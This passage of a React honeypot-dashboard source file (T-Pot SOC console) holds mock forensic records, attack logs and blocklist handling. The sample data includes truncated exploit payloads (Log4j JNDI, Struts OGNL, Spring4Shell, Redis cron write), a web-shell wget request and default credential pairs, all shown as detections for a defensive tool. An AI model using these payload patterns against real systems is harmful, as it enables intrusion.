      hexdump: '0000  00 0c 29 b5 7d 5e 00 50  56 c0 00 08 08 00 45 00  ..).}..PV.....E.\n0010  01 a4 4a ec 40 00 40 06  b7 83 c0 a8 e3 81 c0 a8  ..J.@.@.........\n0020  e3 01 e8 b0 1f 90 2c db  74 b8 d4 cd a0 1c 80 18  ......,.t.......\n0030  00 f5 e5 ed 00 00 01 01  08 0a c6 bf e2 5d 00 1f  .............]..\n0040  7a 02 47 45 54 20 2f 20  48 54 54 50 2f 31 2e 31  z.GET / HTTP/1.1\n0050  0d 0a 55 73 65 72 2d 41  67 65 6e 74 3a 20 24 7b  ..User-Agent: ${',
      intelRisk: '99/100 (Known Threat Actor)',
      description: 'The attacker is injecting a Log4j JNDI lookup string within the User-Agent header to trigger local classloading of a remote malicious payload. This bypasses typical signature defenses. Guarded by T-Pot Tanner simulation.'
    },
    'PCAP-002': {
      destPort: '445 (SMBv1 Protocol)',
      protocol: 'TCP (Packet #3,412)',
      severity: 'Critical',
      payloadDecoded: '\\xffSMBs\\x00\\x00\\x00\\x00\\x18\\x07\\xc8\\x00\\x00... [Overflown Bytes Size 65535]',
      hexdump: '0000  00 15 5d 01 0c 03 00 15  5d 01 0c 04 08 00 45 00  ..].....].....E.\n0010  00 a8 d4 b8 40 00 80 06  26 b3 c0 a8 a8 a8 c0 a8  ....@...&......\n0020  a8 02 0e a9 01 bd 37 a8  30 cc 0c fc c8 92 50 18  ......7.0.....P.\n0030  40 00 cd e4 00 00 00 00  00 a4 ff 53 4d 42 72 00  @..........SMBr.',
      intelRisk: '95/100 (EternalBlue MS17-010 Exploitation)',
      description: 'Exploitation attempt of weak SMBv1 buffer parsing logic. Corresponds to active Wannacry or NotPetya worm movement trying to achieve remote system shell elevation.'
    },
    'PCAP-003': {
      destPort: '80 (HTTP / Apache Struts Container)',
      protocol: 'TCP (Packet #944)',
      severity: 'High',
      payloadDecoded: 'Content-Type: %{(#-_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)... [OGNL Command Injection]',
      hexdump: '0000  00 50 56 b8 c0 c1 00 1c  42 a9 e2 fb 08 00 45 00  .PV.....B.....E.\n0010  02 11 a1 b2 40 00 3b 06  e5 9a 5a d9 1a f1 c0 a8  ....@.;...Z.....\n0020  4c 88 00 50 ce d2 5d d9  1a cc be 18 a2 f1 80 18  L..P..].........\n0030  01 f5 e2 a8 00 00 01 01  08 0a c6 a8 b3 1c 00 2a  ...............*\n0040  43 6f 6e 74 65 6e 74 2d  54 79 70 65 3a 20 25 7b  Content-Type: %{',
      intelRisk: '92/100 (Struts OGNL Injection Exploit)',
      description: 'OGNL (Object-Graph Navigation Language) vulnerability exploitation via simulated multi-part content type headers headers to prompt target process file deletion or command execution.'
    },
    'PCAP-004': {
      destPort: '6379 (Redis In-Memory DB)',
      protocol: 'TCP (Packet #612)',
      severity: 'High',
      payloadDecoded: '*1\\r\\n$4\\r\\nINFO\\r\\n   --> config set dir /var/spool/cron',
      hexdump: '0000  00 0c 29 de 44 cd 00 50  56 c0 00 01 08 00 45 00  ..).D..PV.....E.\n0010  00 bc 51 d2 40 00 40 06  aa a4 c0 a8 01 64 c0 a8  ..Q.@.@......d..\n0020  01 01 18 eb 18 eb 00 00  21 a4 00 00 2a ce 50 18  ........!...*.P.\n0030  20 00 34 b1 00 00 2a 31  0d 0a 24 34 0d 0a 49 4e   .4...*1..$4..IN\n0040  46 4f 0d 0a 2a 34 0d 0a  24 36 0d 0a 63 6f 6e 66  FO..*4..$6..conf',
      intelRisk: '88/100 (Redis SSH Key Exploit Attempt)',
      description: 'Attempting to configure directory write access inside crontab path or SSH authorized_keys file path to deploy rogue daemon.'
    },
    'PCAP-005': {
      destPort: '8080 (HTTP / Spring Container)',
      protocol: 'TCP (Packet #2,105)',
      severity: 'High',
      payloadDecoded: 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7bprefix%7di',
      hexdump: '0000  00 1c 42 a9 e2 fb 00 50  56 b8 c0 c1 08 00 45 00  ..B....PV.....E.\n0010  03 b1 a4 f5 40 00 40 06  e1 1c 3a f2 1d 58 c0 a8  ....@.@...:..X..\n0020  e2 b2 1f 90 1f 90 db d2  1a d9 b5 b1 e8 b2 80 18  ................\n0030  00 e1 f5 e2 00 00 01 01  08 0a c6 bf e2 aa 00 2f  .............../\n0040  63 6c 61 73 73 2e 6d 6f  64 75 6c 65 2e 63 6c 61  class.module.cla',
      intelRisk: '90/100 (Spring4Shell Remote execution)',
      description: 'Exploitation vector targeted towards Java Spring Framework applications, tampering with classloader definitions to deploy a Tomcat server log file servlet backdoor.'
    }
  };

  // Dynamic Live Attacks Counters
  const [totalAttacks, setTotalAttacks] = useState<number>(1284510);
  const [uniqueIps, setUniqueIps] = useState<number>(45219);
  const [malwareCaptured, setMalwareCaptured] = useState<number>(2845);
  
  // Global search keywords
  const [globalSearch, setGlobalSearch] = useState<string>('');

  // Toast notification state
  const [toastMessage, setToastMessage] = useState<{ text: string; type: 'info' | 'success' | 'warning' | 'danger' } | null>(null);

  // Trigger Toast Notification Helper
  const showToast = (text: string, type: 'info' | 'success' | 'warning' | 'danger' = 'info') => {
    setToastMessage({ text, type });
    // Play audio beep tone programmatically if enabled
    if (synthSoundEnabled && typeof window !== 'undefined' && (window as any).AudioContext || (window as any).webkitAudioContext) {
      try {
        const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
        const osc = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();
        osc.connect(gainNode);
        gainNode.connect(audioCtx.destination);
        
        if (type === 'danger') {
          osc.frequency.setValueAtTime(180, audioCtx.currentTime);
          osc.frequency.linearRampToValueAtTime(80, audioCtx.currentTime + 0.3);
          gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
        } else if (type === 'success') {
          osc.frequency.setValueAtTime(600, audioCtx.currentTime);
          osc.frequency.linearRampToValueAtTime(900, audioCtx.currentTime + 0.15);
          gainNode.gain.setValueAtTime(0.08, audioCtx.currentTime);
        } else {
          osc.frequency.setValueAtTime(440, audioCtx.currentTime);
          gainNode.gain.setValueAtTime(0.05, audioCtx.currentTime);
        }
        
        osc.start();
        osc.stop(audioCtx.currentTime + 0.3);
      } catch (err) {
        // Safe skip audio issues
      }
    }
  };

  useEffect(() => {
    if (toastMessage) {
      const timer = setTimeout(() => setToastMessage(null), 4000);
      return () => clearTimeout(timer);
    }
  }, [toastMessage]);

  // Synchronize initial state with T-Pot platform backend
  useEffect(() => {
    const syncWithTPotBackend = async () => {
      try {
        const res = await fetch('/api/v1/honeypot/attack-map/live?limit=15');
        if (res.ok) {
          const data = await res.json();
          if (data.summary) {
            setTotalAttacks(data.summary.totalAttacksToday);
            setUniqueIps(data.summary.uniqueIpsToday);
            setMalwareCaptured(data.summary.malwareSamplesCaptured);
          }
          if (data.nodes && data.nodes.length > 0) {
            setNodes(data.nodes.map((n: any) => ({
              id: n.id,
              name: n.name,
              ip: n.ip,
              type: n.type,
              cpu: n.cpuUsage || 25,
              ram: n.memoryUsage || 45,
              disk: n.diskUsage || 30,
              uptime: n.uptime || '14d',
              status: n.status === 'ONLINE' ? 'Online' : 'Offline',
              containers: n.containers || ['Cowrie', 'Dionaea']
            })));
          }
        }

        const blockRes = await fetch('/api/v1/honeypot/blocked-ips');
        if (blockRes.ok) {
          const blockData = await blockRes.json();
          if (blockData.blockedList) {
            const serverIps = blockData.blockedList.map((b: any) => b.ip);
            setBlacklistAddresses(prev => [...new Set([...prev, ...serverIps])]);
          }
        }
      } catch {
        // Fallback to local defaults if network drops
      }
    };

    syncWithTPotBackend();
  }, []);

  // Synchronous redirection when roles shift
  useEffect(() => {
    if (currentUserRole === 'Auditor') {
      setActiveTab('audit');
    } else if (currentUserRole === 'Analyst') {
      setActiveTab('dashboard');
    } else {
      setActiveTab('dashboard');
    }
    setExpandedLogId(null);
  }, [currentUserRole]);

  // Cowrie terminal session loop simulation
  useEffect(() => {
    if (!terminalPlaying) return;

    if (currentCmdStep >= cowrieTerminalScript.length) {
      const resetTimeout = setTimeout(() => {
        setTerminalLines([]);
        setCurrentCmdStep(0);
      }, 4000);
      return () => clearTimeout(resetTimeout);
    }

    const delay = (currentCmdStep === 0 ? 800 : 2200) / playbackSpeed;
    
    const timer = setTimeout(() => {
      const step = cowrieTerminalScript[currentCmdStep];
      setTerminalLines(prev => [...prev, `root@tpot-deception-node:~# ${step.cmd}`]);
      
      let outputTimer: any;
      if (step.output) {
        outputTimer = setTimeout(() => {
          setTerminalLines(prev => [...prev, ...step.output.split('\n')]);
        }, 300 / playbackSpeed);
      }
      
      setCurrentCmdStep(prev => prev + 1);
      
      return () => {
        if (outputTimer) clearTimeout(outputTimer);
      };
    }, delay);

    return () => clearTimeout(timer);
  }, [terminalPlaying, currentCmdStep, playbackSpeed]);

  // Static Mock Distributions
  const countryDistribution: DistributionItem[] = [
    { name: 'China (CN)', value: 445210 },
    { name: 'Russia (RU)', value: 312040 },
    { name: 'United States (US)', value: 184560 },
    { name: 'Germany (DE)', value: 124030 },
    { name: 'Netherlands (NL)', value: 92840 },
    { name: 'Brazil (BR)', value: 68120 },
    { name: 'India (IN)', value: 58210 },
  ];
  
  const protocolDistribution = [
    { name: 'SSH (Cowrie)', attacks: 72450 },
    { name: 'Telnet (Cowrie)', attacks: 48120 },
    { name: 'SMB (Dionaea)', attacks: 35140 },
    { name: 'MSSQL (Dionaea)', attacks: 22840 },
    { name: 'HTTP (Tanner)', attacks: 18450 },
    { name: 'SIP (Honeytrap)', attacks: 9120 }
  ];

  const COLOR_PALETTE = ['#EF4444', '#F97316', '#3B82F6', '#10B981', '#8B5CF6', '#EC4899', '#64748B'];

  // State lists
  const [logs, setLogs] = useState<HoneypotEvent[]>([
    { id: 'LOG-001', time: '11:06:58', node: 'HIVE-MAIN-01', ip: '185.195.233.102', country: 'Russia', countryCode: 'RU', protocol: 'SSH/22', honeypot: 'Cowrie', payload: 'USER="root" PASS="123456" (Failed)', severity: 'High', actionTaken: 'Trapped' },
    { id: 'LOG-002', time: '11:06:45', node: 'SENSOR-APAC-SK', ip: '43.239.58.41', country: 'China', countryCode: 'CN', protocol: 'HTTP/80', honeypot: 'Glastopf/Tanner', payload: 'GET /shell.php?cmd=wget... HTTP/1.1', severity: 'Critical', actionTaken: 'Trapped' },
    { id: 'LOG-003', time: '11:06:30', node: 'SENSOR-US-EAST', ip: '124.8.42.155', country: 'China', countryCode: 'CN', protocol: 'SSH/22', honeypot: 'Cowrie', payload: 'USER="admin" PASS="admin" (Bypassed C-Shell)', severity: 'Critical', actionTaken: 'Trapped' },
    { id: 'LOG-004', time: '11:06:12', node: 'SENSOR-EU-WEST', ip: '92.41.115.8', country: 'Germany', countryCode: 'DE', protocol: 'MSSQL/1433', honeypot: 'Dionaea', payload: 'TDS Login with sa:password', severity: 'Medium', actionTaken: 'Trapped' },
    { id: 'LOG-005', time: '11:05:41', node: 'HIVE-MAIN-01', ip: '103.44.122.5', country: 'India', countryCode: 'IN', protocol: 'SMB/445', honeypot: 'Dionaea', payload: 'SMB2 Negotiate Protocol Request', severity: 'High', actionTaken: 'Trapped' },
    { id: 'LOG-006', time: '11:04:19', node: 'SENSOR-APAC-SK', ip: '198.51.100.4', country: 'United States', countryCode: 'US', protocol: 'SIP/5060', honeypot: 'Honeytrap', payload: 'REGISTER sip:101@targetSIP;transport=UDP', severity: 'Low', actionTaken: 'Trapped' },
    { id: 'LOG-007', time: '11:02:05', node: 'SENSOR-LATAM', ip: '186.210.15.54', country: 'Brazil', countryCode: 'BR', protocol: 'Telnet/23', honeypot: 'Cowrie', payload: 'USER="guest" PASS="guest" ', severity: 'Medium', actionTaken: 'Trapped' }
  ]);

  const [nodes, setNodes] = useState<NodeData[]>([
    { id: 'n1', name: 'HIVE-MAIN-01', ip: '10.142.0.4', type: 'HIVE', cpu: 42, ram: 65, disk: 38, uptime: '14d 6h', status: 'Online', containers: ['Cowrie', 'Dionaea', 'Elasticsearch', 'Kibana', 'Logstash'] },
    { id: 'n2', name: 'SENSOR-US-EAST', ip: '34.200.12.82', type: 'SENSOR', cpu: 18, ram: 42, disk: 15, uptime: '8d 14h', status: 'Online', containers: ['Cowrie', 'Dionaea', 'Honeytrap'] },
    { id: 'n3', name: 'SENSOR-EU-WEST', ip: '52.128.5.155', type: 'SENSOR', cpu: 22, ram: 41, disk: 18, uptime: '32d 1h', status: 'Online', containers: ['Cowrie', 'Tanner', 'Glastopf'] },
    { id: 'n4', name: 'SENSOR-APAC-SK', ip: '115.82.90.14', type: 'SENSOR', cpu: 31, ram: 58, disk: 22, uptime: '4d 21h', status: 'Online', containers: ['Cowrie', 'Dionaea', 'Adbhoney'] },
    { id: 'n5', name: 'SENSOR-LATAM', ip: '200.41.12.78', type: 'SENSOR', cpu: 89, ram: 92, disk: 85, uptime: '3h 12m', status: 'Online', containers: ['Cowrie', 'Maltrieve', 'Dionaea'] },
    { id: 'n6', name: 'SENSOR-AFRICA', ip: '197.80.2.14', type: 'SENSOR', cpu: 0, ram: 0, disk: 0, uptime: 'Downtime', status: 'Offline', containers: ['Cowrie'] },
  ]);

  const [malware, setMalware] = useState<MalwareSample[]>([
    { id: 'm-1', filename: 'mirai.x86_downloader', sha256: '5cd3de99742a1efba8c5982845c4852924514a600122e2b0244db9f9bb49f2ca', size: '142.5 KB', time: '11:04:15', virusTotal: '61 / 72 (Mirai.Trojan)', severity: 'Critical' },
    { id: 'm-2', filename: 'miner_setup.sh', sha256: 'a127f8e8150ea2ab9ce41a54728d1c92a6c8e3128fd03fe9093a10bebe54245d', size: '12.4 KB', time: '10:52:10', virusTotal: '54 / 71 (Coinminer.Shell)', severity: 'High' },
    { id: 'm-3', filename: 'tsunami.mips', sha256: '38eaab6bc0192a54fbcfd1822e11a6efcac698ed09121d5a7d903a28cba5ef71', size: '254.1 KB', time: '10:14:45', virusTotal: '59 / 72 (Gafgyt.Worm)', severity: 'Critical' },
    { id: 'm-4', filename: 'ssh_scanner_arm', sha256: 'da39a3ee5e6b4b0d3255bfef95601890afd80709d3b84c8a2b5e2a22be14115e', size: '1.2 MB', time: '09:05:30', virusTotal: '41 / 72 (ScanTool.Agent)', severity: 'Medium' }
  ]);

  const [credentials, setCredentials] = useState<CredentialAttempt[]>([
    { id: 'c-1', username: 'root', password: 'password', count: 14502, node: 'Cowrie Global' },
    { id: 'c-2', username: 'admin', password: 'admin', count: 12154, node: 'Cowrie Global' },
    { id: 'c-3', username: 'root', password: 'root', count: 9812, node: 'Cowrie Global' },
    { id: 'c-4', username: 'ubuntu', password: 'ubuntu', count: 6542, node: 'Cowrie Global' },
    { id: 'c-5', username: 'oracle', password: '123', count: 4101, node: 'Dionaea DB' },
    { id: 'c-6', username: 'guest', password: 'guest', count: 3201, node: 'Telnet Cowrie' },
    { id: 'c-7', username: 'admin', password: '123456', count: 2841, node: 'Cowrie Global' }
  ]);

  // Blacklist database representation
  const [blacklistAddresses, setBlacklistAddresses] = useState<string[]>([
    '185.195.233.102',
    '43.239.58.41',
    '124.8.42.155'
  ]);

  // SIEM integrations connectors configs
  const [coDefendsActive, setCoDefendsActive] = useState<boolean>(true);
  const [fortinetApiKey, setFortinetApiKey] = useState<string>('FTNT-SEC-8921B-441A9');
  const [paloAltoEndpoint, setPaloAltoEndpoint] = useState<string>('https://pa-edge.local-ledger.corp/api');
  const [splunkWebhook, setSplunkWebhook] = useState<string>('https://splunk.internal:8088/services/collector');

  // Logs filters state
  const [filterHoneypot, setFilterHoneypot] = useState<string>('All');
  const [filterCountry, setFilterCountry] = useState<string>('All');
  const [expandedLogId, setExpandedLogId] = useState<string | null>(null);

  // Modal Terminal simulation state
  const [showTerminalModal, setShowTerminalModal] = useState<boolean>(false);
  const [terminalNode, setTerminalNode] = useState<NodeData | null>(null);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [terminalInput, setTerminalInput] = useState<string>('');
  
  // Modal Edit Node configuration
  const [showEditNodeModal, setShowEditNodeModal] = useState<boolean>(false);
  const [editingNode, setEditingNode] = useState<NodeData | null>(null);

  // Modal Add New Node configuration
  const [showAddNodeModal, setShowAddNodeModal] = useState<boolean>(false);
  const [newNodeName, setNewNodeName] = useState<string>('');
  const [newNodeIp, setNewNodeIp] = useState<string>('');
  const [newNodeType, setNewNodeType] = useState<'HIVE' | 'SENSOR'>('SENSOR');

  const containerRef = useRef<HTMLDivElement>(null);

  // Periodic random attack simulator to feed dynamic live attack wall & KPIs
  useEffect(() => {
    if (currentUserRole === 'Auditor') {
      return;
    }

    const randomTimer = setInterval(() => {
      // 1. Roll for dummy event
      const attackers = [
        { ip: '185.5.122.9', country: 'Germany', code: 'DE', honeypot: 'Cowrie', protocol: 'SSH/22', payload: 'USER="root" PASS="admin1" (Denied)' },
        { ip: '112.18.244.150', country: 'China', code: 'CN', honeypot: 'Glastopf/Tanner', protocol: 'HTTP/8080', payload: 'GET /wp-admin/includes/... HTTP/1.1' },
         { ip: '210.16.5.94', country: 'India', code: 'IN', honeypot: 'Conpot', protocol: 'Modbus/502', payload: 'Function Code 43 (Diagnostics)' },
        { ip: '109.12.33.220', country: 'Russia', code: 'RU', honeypot: 'Dionaea', protocol: 'SMB/445', payload: 'Negotiate Protocol request' },
        { ip: '202.94.12.50', country: 'United States', code: 'US', honeypot: 'Cowrie', protocol: 'SSH/22', payload: 'USER="webuser" PASS="12345"' },
        { ip: '31.13.220.3', country: 'Brazil', code: 'BR', honeypot: 'Dionaea', protocol: 'MSSQL/1433', payload: 'TDS Handshake buffer' }
      ];

      const selectedAttacker = attackers[Math.floor(Math.random() * attackers.length)];
      const randomNodeList = ['HIVE-MAIN-01', 'SENSOR-US-EAST', 'SENSOR-EU-WEST', 'SENSOR-APAC-SK', 'SENSOR-LATAM'];
      const targetNode = randomNodeList[Math.floor(Math.random() * randomNodeList.length)];
      
      const newEvent: HoneypotEvent = {
        id: `LOG-${Date.now().toString().slice(-3)}`,
        time: new Date().toTimeString().split(' ')[0],
        node: targetNode,
        ip: selectedAttacker.ip,
        country: selectedAttacker.country,
        countryCode: selectedAttacker.code,
        protocol: selectedAttacker.protocol,
        honeypot: selectedAttacker.honeypot,
        payload: selectedAttacker.payload,
        severity: Math.random() > 0.65 ? (Math.random() > 0.8 ? 'Critical' : 'High') : 'Medium',
        actionTaken: 'Trapped'
      };

      // Play light beep synthesizer beep on map/feed update
      if (synthSoundEnabled && activeTab === 'dashboard') {
        try {
          const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
          const osc = audioCtx.createOscillator();
          const gainNode = audioCtx.createGain();
          osc.connect(gainNode);
          gainNode.connect(audioCtx.destination);
          
          osc.frequency.setValueAtTime(400 + Math.random() * 300, audioCtx.currentTime);
          gainNode.gain.setValueAtTime(0.02, audioCtx.currentTime);
          
          osc.start();
          osc.stop(audioCtx.currentTime + 0.1);
        } catch (err) {}
      }

      setLogs(prev => [newEvent, ...prev.slice(0, 19)]);
      setTotalAttacks(prev => prev + 1);
      if (Math.random() > 0.8) setUniqueIps(prev => prev + 1);
      if (Math.random() > 0.95) setMalwareCaptured(prev => prev + 1);

      // Randomly update node resource loads live!
      setNodes(prev => prev.map(n => {
        if (n.status === 'Online') {
          return {
            ...n,
            cpu: Math.max(10, Math.min(99, n.cpu + Math.floor(Math.random() * 11) - 5)),
            ram: Math.max(20, Math.min(95, n.ram + Math.floor(Math.random() * 7) - 3)),
          };
        }
        return n;
      }));

    }, 3800);

    return () => clearInterval(randomTimer);
  }, [activeTab, synthSoundEnabled, currentUserRole]);

  // Trigger Action: Block IP Address
  const handleBlockAddress = async (ip: string) => {
    // Role restrictions checks
    if (currentUserRole === 'Auditor') {
      showToast('權限不足：稽核員僅能看報表，不允許執行黑名單封鎖操作。', 'warning');
      return;
    }

    if (blacklistAddresses.includes(ip)) {
      showToast(`IP [${ip}] 已經在防火牆黑名單中。`, 'info');
      return;
    }

    try {
      await fetch('/api/v1/honeypot/block-attacker', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ip,
          reason: 'T-Pot 蜜罐控制台手動觸發 NAC 與邊界防火牆聯防阻斷',
          blockedBy: `SOC ${currentUserRole}`
        })
      });
    } catch {
      // Background sync
    }

    setBlacklistAddresses(prev => [...prev, ip]);
    showToast(`自動化聯防連動已部署成功！已將對象高危 IP [${ip}] 透過 NAC 與邊界防火牆全面阻斷。`, 'danger');
    
    // Auto change logs action status
    setLogs(prev => prev.map(item => {
      if (item.ip === ip) {
        return { ...item, actionTaken: 'Blocked' };
      }
      return item;
    }));
  };

  // Remove form blacklist
  const handleRemoveFromBlacklist = async (ip: string) => {
    if (currentUserRole !== 'Admin') {
      showToast('特別限制：只有系統管理員 (Admin) 才可以從防禦黑名單中移除 IP。', 'warning');
      return;
    }

    try {
      await fetch('/api/v1/honeypot/unblock-attacker', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip })
      });
    } catch {
      // Background sync
    }

    setBlacklistAddresses(prev => prev.filter(x => x !== ip));
    showToast(`IP [${ip}] 已解封，黑名單規則已從邊緣防火牆規則中移除。`, 'info');
  };

  // Trigger Action: Restart Node service
  const handleRestartService = (nodeId: string, svcName: string) => {
    if (currentUserRole === 'Auditor') {
      showToast('操作遭拒：稽核層級不具備維度管控權力。', 'warning');
      return;
    }

    showToast(`正在發送 Docker 容器重新啟動訊號 [node_id: ${nodeId}, service: ${svcName}] ...`, 'info');
    
    setTimeout(() => {
      showToast(`蜜罐組件 [${svcName}] 容器重啟成功。服務已重置並在線。`, 'success');
    }, 1800);
  };

  // Register Custom Node Form submit
  const handleAddNewNode = (e: React.FormEvent) => {
    e.preventDefault();
    if (currentUserRole !== 'Admin') {
      showToast('只有系統管理員（Admin）可配置新增物理蜜罐節點。', 'warning');
      return;
    }
    if (!newNodeName.trim() || !newNodeIp.trim()) {
      showToast('請齊全地填寫節點名稱與 IP 位址。', 'warning');
      return;
    }

    const brandNode: NodeData = {
      id: `n-${Date.now()}`,
      name: newNodeName,
      ip: newNodeIp,
      type: newNodeType,
      cpu: 24,
      ram: 37,
      disk: 14,
      uptime: '0h 1m',
      status: 'Online',
      containers: ['Cowrie', 'Dionaea', 'Logstash']
    };

    setNodes(prev => [...prev, brandNode]);
    setNewNodeName('');
    setNewNodeIp('');
    setShowAddNodeModal(false);
    showToast(`分散式蜜罐探針節點 [${brandNode.name}] 登錄成功，並自動拉取 T-Pot Docker Compose 初始化設定。`, 'success');
  };

  // Trigger simulated interactive terminal C2 session
  const openSimulatedTerminal = (node: NodeData) => {
    if (currentUserRole === 'Auditor') {
      showToast('稽核角色：無權進入蜜罐系統內部特權 CLI 終端會話。', 'warning');
      return;
    }
    setTerminalNode(node);
    setShowTerminalModal(true);
    setTerminalLogs([
      `T-POT LOGON GATEWAY [${node.name}] SSH Shell Established`,
      `=============================================================`,
      `System: Debian Linux 12 / Docker Core 25.1.0 / T-Pot v24.04`,
      `Service Status: Active & Ingestion Healthy`,
      `Available Commands: tpothelp, docker-ps, log-tail, trigger-alert, clear`,
      `tpot-guest@${node.name.toLowerCase()}:~$ `
    ]);
  };

  const handleTerminalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;

    const cmd = terminalInput.trim().toLowerCase();
    const cleanLogs = [...terminalLogs];
    // Record command line echo
    cleanLogs.push(`tpot-guest@${terminalNode?.name.toLowerCase()}:~$ ${terminalInput}`);
    
    setTerminalInput('');

    if (cmd === 'clear') {
      setTerminalLogs([`tpot-guest@${terminalNode?.name.toLowerCase()}:~$ `]);
      return;
    }

    if (cmd === 'tpothelp') {
      cleanLogs.push('Available T-Pot Operations CLI Interface:');
      cleanLogs.push('  docker-ps      - Lists all running honey services docker containers');
      cleanLogs.push('  log-tail       - Interactively prints out the last 5 records of Cowrie SSH trap');
      cleanLogs.push('  trigger-alert  - Force emit a high-priority dummy threat signal to console');
      cleanLogs.push('  clear          - Clears command screen log trace');
    } else if (cmd === 'docker-ps') {
      cleanLogs.push('CONTAINER ID   IMAGE                 COMMAND                  STATUS          PORTS');
      cleanLogs.push('da41ff23b2e5   tpot/cowrie:latest    "/usr/bin/cowrie"        Up 14 hours     0.0.0.0:22->2222/tcp');
      cleanLogs.push('e9fb4419ad21   tpot/dionaea:latest   "/usr/bin/dionaea"       Up 14 hours     0.0.0.0:445->445/tcp');
      cleanLogs.push('882b4122bc13   tpot/logstash:8.10    "/usr/share/logstash"    Up 14 hours     0.0.0.0:5044/udp');
    } else if (cmd === 'log-tail') {
      cleanLogs.push(' tailing /data/cowrie/log/cowrie.json (last 3 entries):');
      cleanLogs.push('  {"timestamp":"2026-06-12T05:01:22.39Z","eventid":"cowrie.session.connect","src_ip":"81.52.12.8"}');
      cleanLogs.push('  {"timestamp":"2026-06-12T05:01:25.12Z","eventid":"cowrie.login.failed","username":"root","password":"123"}');
      cleanLogs.push('  {"timestamp":"2026-06-12T05:01:29.84Z","eventid":"cowrie.session.closed","duration":7.52}');
    } else if (cmd === 'trigger-alert') {
      cleanLogs.push('[WARN] SIMULATED THREAT ALARM TRIGGERED');
      // Inject alert dynamically on back end
      const alertIp = `${100 + Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.15`;
      const freshAlert: HoneypotEvent = {
        id: `ALM-${Date.now().toString().slice(-4)}`,
        time: new Date().toTimeString().split(' ')[0],
        node: terminalNode?.name || 'HIVE-MAIN',
        ip: alertIp,
        country: 'Russia',
        countryCode: 'RU',
        protocol: 'SMB/445',
        honeypot: 'Dionaea',
        payload: 'EMERGENCY: WannaCry DoublePulsar Signature Detected',
        severity: 'Critical',
        actionTaken: 'Trapped'
      };
      setLogs(prev => [freshAlert, ...prev]);
      showToast(`手動演練探針警報觸發成功：WannaCry 探測特徵已廣播至中央 Kibana 分析模組！`, 'danger');
    } else {
      cleanLogs.push(`bash: ${cmd}: command not found. Type "tpothelp" for tool guidelines.`);
    }

    cleanLogs.push(`tpot-guest@${terminalNode?.name.toLowerCase()}:~$ `);
    setTerminalLogs(cleanLogs);
  };

  // Helper renderer for specific containers
  const getContainerTagColor = (c: string) => {
    switch (c.toLowerCase()) {
      case 'cowrie': return 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20';
      case 'dionaea': return 'bg-purple-500/10 text-purple-400 border-purple-500/20';
      case 'elasticsearch': return 'bg-green-500/10 text-green-400 border-green-500/20';
      case 'tanner': return 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20';
      default: return 'bg-gray-500/10 text-gray-400 border-gray-500/20';
    }
  };

  // Export functions
  const handleExportBlacklist = (format: 'csv' | 'json' | 'stix') => {
    let content = '';
    const filename = `tpot-mitigation-blacklist.${format}`;

    if (format === 'csv') {
      content = "IPAddress,SecurityWeight,Action,TargetConnectors\n" + blacklistAddresses.map(ip => `${ip},100,Block,PaloAlto-Fortinet`).join("\n");
    } else if (format === 'json') {
      content = JSON.stringify(blacklistAddresses.map(ip => ({ ip, riskScore: 100, policy: 'DROP_INBOUND', platforms: ['fortinet', 'palo_alto'] })), null, 2);
    } else {
      content = JSON.stringify({
        type: "bundle",
        id: "bundle--ce6f8e-d922-4412-a1",
        objects: blacklistAddresses.map((ip, idx) => ({
          type: "indicator",
          id: `indicator--idx-${idx}`,
          created: new Date().toISOString(),
          pattern: `[ipv4-addr:value = '${ip}']`,
          valid_from: new Date().toISOString()
        }))
      }, null, 2);
    }

    const element = document.createElement("a");
    const file = new Blob([content], { type: 'text/plain' });
    element.href = URL.createObjectURL(file);
    element.download = filename;
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
    showToast(`黑名單高風險 IP 庫已導出為 ${format.toUpperCase()} 防火牆標準格式！`, 'success');
  };

  // Search filter
  const filteredLogs = logs.filter(item => {
    const term = globalSearch.toLowerCase();
    const matchSearch = item.ip.toLowerCase().includes(term) || 
                        item.country.toLowerCase().includes(term) || 
                        item.payload.toLowerCase().includes(term) ||
                        item.node.toLowerCase().includes(term);
    const matchHoneypot = filterHoneypot === 'All' || item.honeypot.includes(filterHoneypot);
    const matchCountry = filterCountry === 'All' || item.country === filterCountry;
    return matchSearch && matchHoneypot && matchCountry;
  });

  const getSidebarTabs = () => {
    const list: { id: 'dashboard' | 'attack-map' | 'nodes' | 'logs' | 'malware' | 'settings' | 'audit' | 'pcap' | 'honeytoken' | 'analysis'; label: string; desc: string; isDisabled?: boolean }[] = [
      { id: 'dashboard', label: getLoc('tab_dashboard'), desc: 'Threat Information' },
      { id: 'attack-map', label: getLoc('tab_attack_map'), desc: 'Realtime Cyber Battlefield' }
    ];

    if (currentUserRole !== 'Auditor') {
      list.push({ id: 'nodes', label: getLoc('tab_nodes'), desc: 'Nodes & Telemetry' });
    }

    list.push({ id: 'logs', label: getLoc('tab_logs'), desc: 'Raw Elastic Log' });

    if (currentUserRole !== 'Auditor') {
      list.push({ id: 'analysis', label: getLoc('tab_analysis'), desc: 'Specialist Inquest' });
      list.push({ id: 'pcap', label: getLoc('tab_pcap'), desc: 'Suricata Forensics' });
      list.push({ id: 'honeytoken', label: getLoc('tab_honeytoken'), desc: 'Decoy Active Traps' });
      list.push({ id: 'malware', label: getLoc('tab_malware'), desc: 'Malware Sandbox' });
    }

    if (currentUserRole !== 'Analyst') {
      list.push({ id: 'audit', label: getLoc('tab_audit'), desc: 'Audit Security Trace' });
    }

    if (currentUserRole !== 'Auditor') {
      list.push({ 
        id: 'settings', 
        label: getLoc('tab_settings'), 
        desc: 'Block Mitigation',
        isDisabled: currentUserRole === 'Analyst'
      });
    }

    return list;
  };

  return (
    <div className="min-h-screen bg-[#07090e] text-gray-200 font-sans relative pb-12" id="tpot-control-hub-framework">
      
